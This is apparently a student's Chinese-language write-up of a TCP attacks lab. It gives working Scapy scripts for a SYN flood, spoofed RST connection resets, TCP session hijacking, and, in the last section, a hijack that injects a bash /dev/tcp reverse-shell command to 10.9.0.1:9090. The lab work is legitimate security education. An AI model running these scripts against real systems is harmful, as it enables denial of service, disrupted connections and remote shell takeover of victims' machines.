# TCP Attack

## TCP Flooding

![image-20260322191449791](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322191449791.png)

### 1.1

```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # 源 iP
    pkt[TCP].sport = getrandbits(16)     # 源端口号
    pkt[TCP].seq   = getrandbits(32)     # 序列号
    send(pkt, verbose = 0)
```

使用受害者的IP，telnet的23端口。

![image-20260322193412728](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322193412728.png)

攻击失败，原因：

在发出 SYN+ACK 数据包后，受害机器将等待ACK数据包。如果它没有及时到来，TCP将重传 SYN+ACK 数据包。

在这5次重传之后，TCP 将把相应的连接从半打开的连接队列中删除。每当一个连接被删除时， 就会有一个空位出现。

```
# sysctl -w net.ipv4.tcp_max_syn_backlog=80
```

![image-20260322193850939](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322193850939.png)

可以看到容量已被填满

![image-20260322194012965](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322194012965.png)

攻击成功

### 1.2

先恢复半连接容量大小

![image-20260322194359092](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322194359092.png)

实际容量在130左右

![image-20260322194420933](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322194420933.png)

攻击失败，try了一会连上了

缩小队列至128，实际容量98左右

依旧失败

缩小至100

成功

![image-20260322195153107](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322195153107.png)

### 1.3

syncookies置1

![image-20260322195254647](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322195254647.png)

#### python

![image-20260322195419723](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322195419723.png)

攻击失败

#### c

![image-20260322195333771](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322195333771.png)

攻击失败

![image-20260322195443716](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322195443716.png)

两次攻击都能使队列填满甚至溢出但攻击始终不成功。

## TCP 复位

### 2.1 手动复位攻击

![image-20260322201602460](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322201602460.png)

```python
#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.7", dst="10.9.0.6")
tcp = TCP(sport=23, dport=41864, flags="R", seq=1653841740) #seq是上一个client发向server的包的ack
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

![image-20260322202331973](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322202331973.png)

攻击成功

### 2.2 自动复位攻击

```python
#!/usr/bin/env python3
from scapy.all import *

def send_rst(pkt):
    ip = IP(src = pkt[IP].dst,dst = pkt[IP].src) #伪造server向client发送rst包
    tcp = TCP(sport = pkt[IP].dport,dport = pkt[TCP].sport, flags = "R", seq = pkt[TCP].ack)#seq是上一个																							#client发向																							 #server的包的																								#ack
    rst_pkt = ip/tcp
    ls(rst_pkt)
    send(rst_pkt,verbose = 0)

sniff(iface = 'br-0391639607e8',filter = 'tcp and src host 10.9.0.6', prn=send_rst)
```



![image-20260322203012062](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322203012062.png)

## TCP 会话劫持

### 3 自动劫持

```python3
#!/usr/bin/python3
from scapy.all import *

def print_pkt(pkt):

    if(pkt[TCP].sport == 23):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src) #伪造client向server发包
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='A', seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(pkt[TCP].payload))#seq是上一个server发向client的包的ack，ack是下一个seq，即seq加上data长度
        data = "echo Hijack Success >> auth\n\0"
        packet = ip/tcp/data
        send(packet, verbose=0)

sniff(iface='br-0391639607e8', filter="tcp and dst host 10.9.0.6 and src port 23", prn=print_pkt)
```

![image-20260322211402315](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322211402315.png)

## TCP建立反向SHELL

### 4

```python
#!/usr/bin/python3
from scapy.all import *

def print_pkt(pkt):

    if(pkt[TCP].sport):
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags='A', seq=pkt[TCP].ack, ack=pkt[TCP].seq+len(pkt[TCP].payload))
        data = "bash -i >& /dev/tcp/10.9.0.1/9090 0>&1\n\0"#建立反向shell
        packet = ip/tcp/data
        send(packet, verbose=0)

sniff(iface='br-0391639607e8', filter="tcp and dst host 10.9.0.6 and src port 23", prn=print_pkt)
```

![image-20260322212334533](C:\Users\***\AppData\Roaming\Typora\typora-user-images\image-20260322212334533.png)

成功获得反向shell。